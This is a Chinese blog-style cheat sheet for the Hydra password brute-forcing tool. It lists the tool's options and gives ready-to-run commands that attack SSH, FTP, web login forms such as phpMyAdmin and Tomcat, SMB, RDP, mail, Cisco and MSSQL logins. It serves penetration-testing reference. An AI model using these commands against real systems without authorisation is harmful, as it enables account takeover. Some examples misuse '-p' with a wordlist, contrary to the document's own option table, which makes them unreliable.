---
title: "Hydra"
date: 2016-07-10 14:18
---

## 0x00 hydra

hydra是著名黑客组织thc的一款开源的暴力密码破解工具,支持破解多种密码。

##0x01 option

```
-R          继续从上一次进度接着破解
-S          采用SSL链接
-s <PORT>   可通过这个参数指定非默认端口
-l <LOGIN>  指定破解的用户，对特定用户破解
-L <FILE>   指定用户名字典
-p <PASS>   指定密码破解，少用，一般是采用密码字典
-P <FILE>   指定密码字典
-e <nsr>     额外可选选项，n (空密碼，即不指定密碼)， s (將帳號同時當成密碼用)，r (將帳號/密碼調換使用)
-C <FILE>   使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数
-M <FILE>   指定目标列表文件一行一条
-o <FILE>   指定结果输出文件
-f          在使用-M参数以后，找到第一对登录名或者密码的时候中止破解
-t <TASKS>  同时运行的线程数，默认为16
-w <TIME>   设置最大超时的时间，单位秒，默认是30s
-v / -V     显示详细过程
-SuvVd46：是多個選項的組合，分別表示：
    S：使用SSL連線
    u：每一組密碼都用帳號輪流測試，而不是每一組帳號用密碼輪流測試。
    v V d U 是訊息的詳細度
    4 6 是 IP address 格式(IPv4 或 IPv6)
server      目标ip
service     指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等
```

## 0x02 use demo

### `ssh`

```
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh
```

### `ftp`

```
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
```

### http

* http post form attack

```
hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “/login.php:name=^USER^&pwd=^PASS^:incorrect:H=Cookie: security=low; PHPSESSID=o7qiqd9fc1d003u9d38k64t0f4”
hydra -l admin -P passwords.lst -e ns -vV 192.168.2.10 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied"
hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>"
```

> http-post-form or http-get-form

> incorrect表示错误猜解的返回信息提示，自定义,最好和页面返回的信息一致，不要略写，不然可能产生错报，具体原因待去看源码

**:H= 表示手工设置的Header**

* http get

```
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
```

比如爆破登陆密码: 

`phpmyadmin`

```
hydra -l root -P /root/pwd.lst -e ns -vV -f 192.168.32.6 http-get /phpmyadmin/
```

`tomcat`

```
hydra -l tomcat -P /root/top50000 -t 16 -ens -f -vV 192.168.32.6 -s 8081 http-get /manager/html
```

### `https`

```
hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https
```

### `teamspeak`

```
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak
```

### `cisco`

```
hydra -P pass.txt 10.36.16.18 cisco
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable
```

### `smb`

```
hydra -l administrator -P pass.txt 10.36.16.18 smb
```

### `pop3`

```
hydra -l muts -P pass.txt my.pop3.mail pop3
```

### `rdp`

```
hydra ip rdp -l administrator -P pass.txt -V
```

### `http-proxy`

```
hydra -l admin -P pass.txt http-proxy://10.36.16.18
```

### `imap`

```
hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
```

### `mssql`

```
hydra -l sa -P /root/Password/pass.txt mssql://192.168.1.11 -o ok.txt
```
